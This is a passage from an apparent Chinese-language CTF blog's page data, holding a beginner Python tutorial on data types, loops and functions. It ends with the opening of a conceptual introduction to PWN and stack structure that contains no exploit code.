aria-hidden=\"true\">image-20220913154815147</figcaption>\r\n</figure>\r\n<ul>\r\n<li>字符串<strong>不可变</strong></li>\r\n</ul>\r\n<p><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">s = <span class=\"string\">&#x27;hello world&#x27;</span></span><br><span class=\"line\">s[<span class=\"number\">0</span>] = <span class=\"string\">&#x27;b&#x27;</span>   <span class=\"comment\"># 错误，会执行失败</span></span><br></pre></td></tr></table></figure></p>\r\n<ul>\r\n<li>字符串截取操作：变量[头下标:尾下标:步长]，下标即索引</li>\r\n</ul>\r\n<p><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">s = <span class=\"string\">&#x27;hello world&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(s[<span class=\"number\">1</span>:<span class=\"number\">3</span>])   <span class=\"comment\"># 输出 el</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(s[<span class=\"number\">2</span>:-<span class=\"number\">1</span>]) <span class=\"comment\"># 输出 llo worl</span></span><br></pre></td></tr></table></figure></p>\r\n<h4 id=\"列表\">列表</h4>\r\n<ul>\r\n<li>列表为Python中最频繁使用的数据类型，列表中元素的类型<strong>可以不相同</strong>，支持数字，字符串甚至可以包含列表（即嵌套）</li>\r\n<li>列表写在方括号[] 之间、用逗号分隔开</li>\r\n<li>列表可以像字符串一样，被索引和截取，列表被截取后返回一个包含所需元素的新列表。</li>\r\n<li>列表内元素可以被修改</li>\r\n</ul>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">l = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3.14</span>, <span class=\"string\">&#x27;hello&#x27;</span>, [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"string\">&#x27;3&#x27;</span>, <span class=\"string\">&#x27; world&#x27;</span>]]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(l[<span class=\"number\">2</span>:<span class=\"number\">5</span>]) 输出为 [<span class=\"number\">3.14</span>, <span class=\"string\">&#x27;hello&#x27;</span>, [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"string\">&#x27;3&#x27;</span>, <span class=\"string\">&#x27; world&#x27;</span>]]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(l[<span class=\"number\">3</span>] + l[<span class=\"number\">4</span>][<span class=\"number\">3</span>])    <span class=\"comment\"># 输出为 hello world</span></span><br></pre></td></tr></table></figure>\r\n<blockquote>\r\n<p>列表内置了许多方法，可以使用<code>dir(list)</code>查看其提供的方法，然后使用<code>help(list.method)</code>查看帮助，将<code>method</code>替换为需要查看的方法，示例如下：</p>\r\n</blockquote>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">print</span>(<span class=\"built_in\">dir</span>(<span class=\"built_in\">list</span>))</span><br><span class=\"line\">[<span class=\"string\">&#x27;__add__&#x27;</span>, <span class=\"string\">&#x27;__class__&#x27;</span>, <span class=\"string\">&#x27;__class_getitem__&#x27;</span>, <span class=\"string\">&#x27;__contains__&#x27;</span>, <span class=\"string\">&#x27;__delattr__&#x27;</span>, <span class=\"string\">&#x27;__delitem__&#x27;</span>, <span class=\"string\">&#x27;__dir__&#x27;</span>, <span class=\"string\">&#x27;__doc__&#x27;</span>, <span class=\"string\">&#x27;__eq__&#x27;</span>, <span class=\"string\">&#x27;__format__&#x27;</span>, <span class=\"string\">&#x27;__ge__&#x27;</span>, <span class=\"string\">&#x27;__getattribute__&#x27;</span>, <span class=\"string\">&#x27;__getitem__&#x27;</span>, <span class=\"string\">&#x27;__gt__&#x27;</span>, <span class=\"string\">&#x27;__hash__&#x27;</span>, <span class=\"string\">&#x27;__iadd__&#x27;</span>, <span class=\"string\">&#x27;__imul__&#x27;</span>, <span class=\"string\">&#x27;__init__&#x27;</span>, <span class=\"string\">&#x27;__init_subclass__&#x27;</span>, <span class=\"string\">&#x27;__iter__&#x27;</span>, <span class=\"string\">&#x27;__le__&#x27;</span>, <span class=\"string\">&#x27;__len__&#x27;</span>, <span class=\"string\">&#x27;__lt__&#x27;</span>, <span class=\"string\">&#x27;__mul__&#x27;</span>, <span class=\"string\">&#x27;__ne__&#x27;</span>, <span class=\"string\">&#x27;__new__&#x27;</span>, <span class=\"string\">&#x27;__reduce__&#x27;</span>, <span class=\"string\">&#x27;__reduce_ex__&#x27;</span>, <span class=\"string\">&#x27;__repr__&#x27;</span>, <span class=\"string\">&#x27;__reversed__&#x27;</span>, <span class=\"string\">&#x27;__rmul__&#x27;</span>, <span class=\"string\">&#x27;__setattr__&#x27;</span>, <span class=\"string\">&#x27;__setitem__&#x27;</span>, <span class=\"string\">&#x27;__sizeof__&#x27;</span>, <span class=\"string\">&#x27;__str__&#x27;</span>, <span class=\"string\">&#x27;__subclasshook__&#x27;</span>, <span class=\"string\">&#x27;append&#x27;</span>, <span class=\"string\">&#x27;clear&#x27;</span>, <span class=\"string\">&#x27;copy&#x27;</span>, <span class=\"string\">&#x27;count&#x27;</span>, <span class=\"string\">&#x27;extend&#x27;</span>, <span class=\"string\">&#x27;index&#x27;</span>, <span class=\"string\">&#x27;insert&#x27;</span>, <span class=\"string\">&#x27;pop&#x27;</span>, <span class=\"string\">&#x27;remove&#x27;</span>, <span class=\"string\">&#x27;reverse&#x27;</span>, <span class=\"string\">&#x27;sort&#x27;</span>]</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">help</span>(<span class=\"built_in\">list</span>.append)</span><br><span class=\"line\">Help on method_descriptor:</span><br><span class=\"line\"></span><br><span class=\"line\">append(self, <span class=\"built_in\">object</span>, /)</span><br><span class=\"line\">    Append <span class=\"built_in\">object</span> to the end of the <span class=\"built_in\">list</span>.</span><br></pre></td></tr></table></figure>\r\n<h4 id=\"元组\">元组</h4>\r\n<ul>\r\n<li>元组（tuple）与列表类似，不同之处在于元组的元素<strong>不能修改</strong>。元组写在小括号 () 里，元素之间用逗号隔开。</li>\r\n<li>元组中的元素类型也可以不相同： 示例：</li>\r\n</ul>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">tuple</span> = ( <span class=\"string\">&#x27;abcd&#x27;</span>, <span class=\"number\">786</span> , <span class=\"number\">2.23</span>, <span class=\"string\">&#x27;hello&#x27;</span>, <span class=\"number\">70.2</span>  )</span><br><span class=\"line\">tinytuple = (<span class=\"number\">123</span>, <span class=\"string\">&#x27;ctf&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> (<span class=\"built_in\">tuple</span>)             <span class=\"comment\"># 输出完整元组</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> (<span class=\"built_in\">tuple</span>[<span class=\"number\">0</span>])          <span class=\"comment\"># 输出元组的第一个元素</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> (<span class=\"built_in\">tuple</span>[<span class=\"number\">1</span>:<span class=\"number\">3</span>])        <span class=\"comment\"># 输出从第二个元素开始到第三个元素</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> (<span class=\"built_in\">tuple</span>[<span class=\"number\">2</span>:])         <span class=\"comment\"># 输出从第三个元素开始的所有元素</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> (tinytuple * <span class=\"number\">2</span>)     <span class=\"comment\"># 输出两次元组</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> (<span class=\"built_in\">tuple</span> + tinytuple) <span class=\"comment\"># 连接元组</span></span><br></pre></td></tr></table></figure>\r\n<p>输出结果如下：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">(<span class=\"string\">&#x27;abcd&#x27;</span>, 786, 2.23, <span class=\"string\">&#x27;hello&#x27;</span>, 70.2)</span><br><span class=\"line\">abcd</span><br><span class=\"line\">(786, 2.23)</span><br><span class=\"line\">(2.23, <span class=\"string\">&#x27;hello&#x27;</span>, 70.2)</span><br><span class=\"line\">(123, <span class=\"string\">&#x27;ctf&#x27;</span>, 123, <span class=\"string\">&#x27;ctf&#x27;</span>)</span><br><span class=\"line\">(<span class=\"string\">&#x27;abcd&#x27;</span>, 786, 2.23, <span class=\"string\">&#x27;hello&#x27;</span>, 70.2, 123, <span class=\"string\">&#x27;ctf&#x27;</span>)</span><br></pre></td></tr></table></figure>\r\n<h4 id=\"集合\">集合</h4>\r\n<p>集合（set）是由一个或数个形态各异的大小整体组成的。使用大括号<code>&#123;&#125;</code>或<code>set()</code>创建集合，但创建空集合必须使用<strong>set()</strong>，单独使用{}会创建字典，代码示例如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">sites = &#123;<span class=\"string\">&#x27;Google&#x27;</span>, <span class=\"string\">&#x27;Taobao&#x27;</span>, <span class=\"string\">&#x27;Test&#x27;</span>, <span class=\"string\">&#x27;Facebook&#x27;</span>, <span class=\"string\">&#x27;Zhihu&#x27;</span>, <span class=\"string\">&#x27;Baidu&#x27;</span>, <span class=\"string\">&#x27;Taobao&#x27;</span>&#125;</span><br><span class=\"line\"><span class=\"built_in\">print</span>(sites)   <span class=\"comment\"># 输出集合，重复的元素被自动去掉</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 成员测试</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"string\">&#x27;Test&#x27;</span> <span class=\"keyword\">in</span> sites:</span><br><span class=\"line\"> <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;Test 在集合中&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\"> <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;Test 不在集合中&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># set可以进行集合运算</span></span><br><span class=\"line\">a = <span class=\"built_in\">set</span>(<span class=\"string\">&#x27;abracadabra&#x27;</span>)</span><br><span class=\"line\">b = <span class=\"built_in\">set</span>(<span class=\"string\">&#x27;alacazam&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(a)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(a - b)     <span class=\"comment\"># a 和 b 的差集</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(a | b)     <span class=\"comment\"># a 和 b 的并集</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(a &amp; b)     <span class=\"comment\"># a 和 b 的交集</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(a ^ b)     <span class=\"comment\"># a 和 b 中不同时存在的元素</span></span><br></pre></td></tr></table></figure>\r\n<p>结果如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;<span class=\"string\">&#x27;Zhihu&#x27;</span>, <span class=\"string\">&#x27;Baidu&#x27;</span>, <span class=\"string\">&#x27;Taobao&#x27;</span>, <span class=\"string\">&#x27;Test&#x27;</span>, <span class=\"string\">&#x27;Google&#x27;</span>, <span class=\"string\">&#x27;Facebook&#x27;</span>&#125;</span><br><span class=\"line\">Test 在集合中</span><br><span class=\"line\">&#123;<span class=\"string\">&#x27;b&#x27;</span>, <span class=\"string\">&#x27;c&#x27;</span>, <span class=\"string\">&#x27;a&#x27;</span>, <span class=\"string\">&#x27;r&#x27;</span>, <span class=\"string\">&#x27;d&#x27;</span>&#125;</span><br><span class=\"line\">&#123;<span class=\"string\">&#x27;r&#x27;</span>, <span class=\"string\">&#x27;b&#x27;</span>, <span class=\"string\">&#x27;d&#x27;</span>&#125;</span><br><span class=\"line\">&#123;<span class=\"string\">&#x27;b&#x27;</span>, <span class=\"string\">&#x27;c&#x27;</span>, <span class=\"string\">&#x27;a&#x27;</span>, <span class=\"string\">&#x27;z&#x27;</span>, <span class=\"string\">&#x27;m&#x27;</span>, <span class=\"string\">&#x27;r&#x27;</span>, <span class=\"string\">&#x27;l&#x27;</span>, <span class=\"string\">&#x27;d&#x27;</span>&#125;</span><br><span class=\"line\">&#123;<span class=\"string\">&#x27;c&#x27;</span>, <span class=\"string\">&#x27;a&#x27;</span>&#125;</span><br><span class=\"line\">&#123;<span class=\"string\">&#x27;z&#x27;</span>, <span class=\"string\">&#x27;b&#x27;</span>, <span class=\"string\">&#x27;m&#x27;</span>, <span class=\"string\">&#x27;r&#x27;</span>, <span class=\"string\">&#x27;l&#x27;</span>, <span class=\"string\">&#x27;d&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>\r\n<h4 id=\"字典\">字典</h4>\r\n<p>字典是一种映射类型，字典用 { } 标识，它是一个无序的 键(key) : 值(value) 的集合，其中key必须使用不可变类型，同一个字典中，键必须是唯一的。</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">dict</span> = &#123;&#125;</span><br><span class=\"line\"><span class=\"built_in\">dict</span>[<span class=\"string\">&#x27;one&#x27;</span>] = <span class=\"string\">&quot;1 - Hello&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">dict</span>[<span class=\"number\">2</span>]     = <span class=\"string\">&quot;2 - World&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">tinydict = &#123;<span class=\"string\">&#x27;name&#x27;</span>: <span class=\"string\">&#x27;CTF&#x27;</span>,<span class=\"string\">&#x27;code&#x27;</span>:<span class=\"number\">1</span>, <span class=\"string\">&#x27;site&#x27;</span>: <span class=\"string\">&#x27;www.baidu.com&#x27;</span>&#125;</span><br><span class=\"line\"><span class=\"built_in\">print</span> (<span class=\"built_in\">dict</span>[<span class=\"string\">&#x27;one&#x27;</span>])       <span class=\"comment\"># 输出键为 &#x27;one&#x27; 的值</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> (<span class=\"built_in\">dict</span>[<span class=\"number\">2</span>])           <span class=\"comment\"># 输出键为 2 的值</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> (tinydict)          <span class=\"comment\"># 输出完整的字典</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> (tinydict.keys())   <span class=\"comment\"># 输出所有键</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> (tinydict.values()) <span class=\"comment\"># 输出所有值</span></span><br></pre></td></tr></table></figure>\r\n<p>结果如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span> - Hello</span><br><span class=\"line\"><span class=\"number\">2</span> - World</span><br><span class=\"line\">&#123;<span class=\"string\">&#x27;name&#x27;</span>: <span class=\"string\">&#x27;CTF&#x27;</span>, <span class=\"string\">&#x27;code&#x27;</span>: <span class=\"number\">1</span>, <span class=\"string\">&#x27;site&#x27;</span>: <span class=\"string\">&#x27;www.baidu.com&#x27;</span>&#125;</span><br><span class=\"line\">dict_keys([<span class=\"string\">&#x27;name&#x27;</span>, <span class=\"string\">&#x27;code&#x27;</span>, <span class=\"string\">&#x27;site&#x27;</span>])</span><br><span class=\"line\">dict_values([<span class=\"string\">&#x27;CTF&#x27;</span>, <span class=\"number\">1</span>, <span class=\"string\">&#x27;www.baidu.com&#x27;</span>])</span><br></pre></td></tr></table></figure>\r\n<blockquote>\r\n<p>字典的其他内置函数使用<code>dir(dict)</code>查看</p>\r\n</blockquote>\r\n<h2 id=\"语句\">语句</h2>\r\n<h3 id=\"条件判断\">条件判断</h3>\r\n<p>计算机之所以能做很多自动化的任务，因为它可以自己做条件判断。 比如，输入用户年龄，根据年龄打印不同的内容，在Python程序中，用<code>if</code>语句实现：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">age = <span class=\"number\">20</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> age &gt;= <span class=\"number\">18</span>:</span><br><span class=\"line\"> <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;your age is&#x27;</span>, age)</span><br><span class=\"line\"> <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;adult&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\"> <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;your age is&#x27;</span>, age)</span><br><span class=\"line\"> <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;teenager&#x27;</span>)</span><br></pre></td></tr></table></figure>\r\n<p>条件嵌套判断：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">age = <span class=\"number\">3</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> age &gt;= <span class=\"number\">18</span>:</span><br><span class=\"line\"> <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;adult&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">elif</span> age &gt;= <span class=\"number\">6</span>:</span><br><span class=\"line\"> <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;teenager&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\"> <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;kid&#x27;</span>)</span><br></pre></td></tr></table></figure>\r\n<blockquote>\r\n<p><code>elif</code> 是 <code>else if</code> 的缩写</p>\r\n</blockquote>\r\n<p><strong>练习</strong> 小明身高1.75，体重80.5kg。请根据BMI公式（体重除以身高的平方）帮小明计算他的BMI指数，并根据BMI指数：</p>\r\n<ul>\r\n<li>低于18.5：过轻</li>\r\n<li>18.5-25：正常</li>\r\n<li>25-28：过重</li>\r\n<li>28-32：肥胖</li>\r\n<li>高于32：严重肥胖</li>\r\n</ul>\r\n<p>用<code>if-elif</code>判断并打印结果：</p>\r\n<h3 id=\"循环\">循环</h3>\r\n<p>要计算1+2+3，可以直接写表达式，但要计算1+2+...+10000，直接写表达式就不可能了，为了让计算机能计算成千上万次的重复运算，我们就需要循环语句。 Python循环有两种：<code>for</code>和<code>while</code></p>\r\n<h4 id=\"for循环\">for循环</h4>\r\n<p>示例：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">names = [<span class=\"string\">&#x27;Michael&#x27;</span>, <span class=\"string\">&#x27;Bob&#x27;</span>, <span class=\"string\">&#x27;Tracy&#x27;</span>]</span><br><span class=\"line\"><span class=\"keyword\">for</span> name <span class=\"keyword\">in</span> names:</span><br><span class=\"line\"> <span class=\"built_in\">print</span>(name)</span><br></pre></td></tr></table></figure>\r\n<p>结果如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">Michael</span><br><span class=\"line\">Bob</span><br><span class=\"line\">Tracy</span><br></pre></td></tr></table></figure>\r\n<h4 id=\"while循环\">while循环</h4>\r\n<p>只要条件满足，就不断循环，条件不满足则退出循环。计算100内所有奇数和，使用while循环实现：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">sum</span> = <span class=\"number\">0</span></span><br><span class=\"line\">n = <span class=\"number\">99</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> n &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\"> <span class=\"built_in\">sum</span> += n  <span class=\"comment\"># sum = sum + n</span></span><br><span class=\"line\"> n -= <span class=\"number\">2</span> <span class=\"comment\"># n  = n - 2</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">sum</span>)</span><br></pre></td></tr></table></figure>\r\n<h4 id=\"break\">break</h4>\r\n<p>在循环中，可以使用<code>break</code>语句提前退出循环，</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">n = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> n &lt;= <span class=\"number\">100</span>:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> n &gt; <span class=\"number\">10</span>: <span class=\"comment\"># 当n = 11时，条件满足，执行break语句</span></span><br><span class=\"line\">        <span class=\"keyword\">break</span> <span class=\"comment\"># break语句会结束当前循环</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(n)</span><br><span class=\"line\">    n = n + <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;END&#x27;</span>)</span><br></pre></td></tr></table></figure>\r\n<p>结果为打印1-10后，紧接着打印END，程序结束。</p>\r\n<h4 id=\"continue\">continue</h4>\r\n<p>在循环中，可以使用<code>continue</code>语句跳过当前这次循环，直接开始下一次循环</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">n = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> n &lt; <span class=\"number\">10</span>:</span><br><span class=\"line\">    n = n + <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> n % <span class=\"number\">2</span> == <span class=\"number\">0</span>: <span class=\"comment\"># 如果n是偶数，执行continue语句</span></span><br><span class=\"line\">        <span class=\"keyword\">continue</span> <span class=\"comment\"># continue语句会直接继续下一轮循环，后续的print()语句不会执行</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(n)</span><br></pre></td></tr></table></figure>\r\n<p>执行上面的代码可以看到，打印的不再是1～10，而是1，3，5，7，9</p>\r\n<h2 id=\"函数\">函数</h2>\r\n<h3 id=\"调用函数\">调用函数</h3>\r\n<p>Python内置了很多有用的函数，我们可以直接调用，例如调用abs函数：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">abs</span>(<span class=\"number\">100</span>)</span><br><span class=\"line\"><span class=\"number\">100</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">abs</span>(-<span class=\"number\">20</span>)</span><br><span class=\"line\"><span class=\"number\">20</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">abs</span>(<span class=\"number\">12.34</span>)</span><br><span class=\"line\"><span class=\"number\">12.34</span></span><br></pre></td></tr></table></figure>\r\n<p>调用函数的时候，若传入的参数数量不对，会报<code>TypeError</code>错误，若传入参数数量正确，但参数类型不正确，也会报<code>TypeError</code>错误，示例如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">abs</span>(<span class=\"number\">1</span>, <span class=\"number\">2</span>)</span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">  File <span class=\"string\">&quot;&lt;stdin&gt;&quot;</span>, line <span class=\"number\">1</span>, <span class=\"keyword\">in</span> &lt;module&gt;</span><br><span class=\"line\">TypeError: <span class=\"built_in\">abs</span>() takes exactly one argument (<span class=\"number\">2</span> given)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">abs</span>(<span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">  File <span class=\"string\">&quot;&lt;stdin&gt;&quot;</span>, line <span class=\"number\">1</span>, <span class=\"keyword\">in</span> &lt;module&gt;</span><br><span class=\"line\">TypeError: bad operand <span class=\"built_in\">type</span> <span class=\"keyword\">for</span> <span class=\"built_in\">abs</span>(): <span class=\"string\">&#x27;str&#x27;</span></span><br></pre></td></tr></table></figure>\r\n<p>数据类型转换</p>\r\n<table>\r\n<thead>\r\n<tr class=\"header\">\r\n<th>函数</th>\r\n<th>作用</th>\r\n</tr>\r\n</thead>\r\n<tbody>\r\n<tr class=\"odd\">\r\n<td>int()</td>\r\n<td>将字符串转换为整型</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>float()</td>\r\n<td>将字符串转化为浮点型</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>str()</td>\r\n<td>将参数内容转换为字符串</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>hex()</td>\r\n<td>将整数转换成16进制字符串</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>ord()</td>\r\n<td>将单个字符转换成整型</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>chr()</td>\r\n<td>将整型转换成单个字符</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<h3 id=\"定义函数\">定义函数</h3>\r\n<p>使用<code>def</code>可以定义一个函数，格式包括：函数名、括号，括号中的参数和冒号<code>:</code>，然后在缩进块中编写函数体，函数的返回值用<code>return</code>语句返回。</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">my_print</span>(<span class=\"params\">s</span>):</span><br><span class=\"line\"> <span class=\"built_in\">print</span>(<span class=\"string\">&quot;This is my print function:&quot;</span>, s)</span><br><span class=\"line\"> </span><br><span class=\"line\">my_print(<span class=\"string\">&quot;Hello World&quot;</span>) <span class=\"comment\"># 输出 This is my print funciton: Hello World</span></span><br></pre></td></tr></table></figure>\r\n<p><strong>空函数</strong> 定义一个什么都不做的空函数，使用<code>pass</code>语句</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">nop</span>():</span><br><span class=\"line\"> <span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\r\n<p><code>pass</code>语句什么都不做，那有什么用？实际上<code>pass</code>可以用来作为<strong>占位符</strong>，比如现在还没想好怎么写函数的代码，就可以先放一个<code>pass</code>，让代码能运行起来。</p>\r\n<p><strong>返回多个值</strong> 在游戏中经常需要从一个点移动到另一个点，给出坐标、位移和角度，就可以计算出新的坐标：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> math</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">move</span>(<span class=\"params\">x, y, step, angle=<span class=\"number\">0</span></span>):</span><br><span class=\"line\">    nx = x + step * math.cos(angle)</span><br><span class=\"line\">    ny = y - step * math.sin(angle)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> nx, ny</span><br><span class=\"line\"></span><br><span class=\"line\">x, y = move(<span class=\"number\">100</span>, <span class=\"number\">100</span>, <span class=\"number\">60</span>, math.pi / <span class=\"number\">6</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(x, y) <span class=\"comment\"># 151.96152422706632 70.0</span></span><br></pre></td></tr></table></figure>\r\n<p>其实Python函数返回仍是单一值，其类型为<code>tuple</code></p>\r\n<h3 id=\"函数参数\"><a href=\"https://www.liaoxuefeng.com/wiki/1016959663602400/1017261630425888\">函数参数</a></h3>\r\n<p>Python函数除了正常定义的必选参数外，还可以使用默认参数、可变参数和关键字参数，使得函数定义出来的接口，不但能处理复杂的参数，还可以简化调用者的代码。 这部分较为复杂，主要用于编写软件时需要，目前用不上。</p>\r\n<h2 id=\"学习\">学习</h2>\r\n<p>可以参考<a href=\"https://www.liaoxuefeng.com/wiki/1016959663602400\">廖雪峰Python教程</a>学习</p>\r\n","categories":["Language"],"tags":["python","share"]},{"title":"PWN","url":"/2022/09/13/PWN/","content":"<p>CTF中的pwn指的是通过通过程序本身的漏洞，编写利用脚本破解程序拿到主机的权限，这就需要对程序进行分析，了解操作系统的特性和相关漏洞，是一个难度比较大的分支。</p>\r\n<p>其分类有：栈溢出、堆溢出、整数溢出、格式化字符串漏洞等。</p>\r\n<span id=\"more\"></span>\r\n<h2 id=\"基础知识准备\">基础知识准备</h2>\r\n<p>Pwn相对于CTF其他科目，需要更专业的技能和知识，主要学会如何分析程序，需要足够的知识储备。其中需要准备的知识有：</p>\r\n<ul>\r\n<li>c语言</li>\r\n<li>汇编语言</li>\r\n<li>python</li>\r\n<li>操作系统</li>\r\n<li>linux操作</li>\r\n</ul>\r\n<blockquote>\r\n<p>C语言：当下的比赛大部分的pwn题目的程序都是利用C语言或者C++编写的，IDA的反编译功能也是将二进制变成C/C++，理解并能运用C语言，对于分析程序有很大的帮助。</p>\r\n<p>汇编语言：pwn无法绕过汇编，分析程序首先面对的就是汇编，对于汇编需要有一定的基础，目前掌握x86汇编即可。</p>\r\n<p>Python：用来编写exp，python集成了一个专门用于pwn的库–pwntools，方便使用编写exp脚本。</p>\r\n<p>操作系统：需要了解一定的知识，特别是linux操作系统，栈和堆以及一些操作系统特性造成的漏洞都是我们解题的思路。</p>\r\n<p>linux操作：掌握基础的linux操作命令。</p>\r\n</blockquote>\r\n<h2 id=\"栈溢出\">栈溢出</h2>\r\n<h3 id=\"栈结构\">栈结构</h3>\r\n<p>栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，如下图所示。两种操作都操作栈顶，当然，它也有栈底。</p>\r\n<figure>\r\n<img src=\"/2022/09/13/PWN/image-20220913172349359.png\" alt=\"stack\"><figcaption aria-hidden=\"true\">stack</figcaption>\r\n</figure>\r\n<p>高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，<strong>程序的栈是从进程地址空间的高地址向低地址增长的。</strong></p>\r\n<h3 id=\"函数调用栈\">函数调用栈</h3>\r\n<h4 id=\"寄存器分配\">寄存器分配</h4>\r\n<figure>\r\n<img src=\"/2022/09/13/PWN/image-20220913172359745.png\" 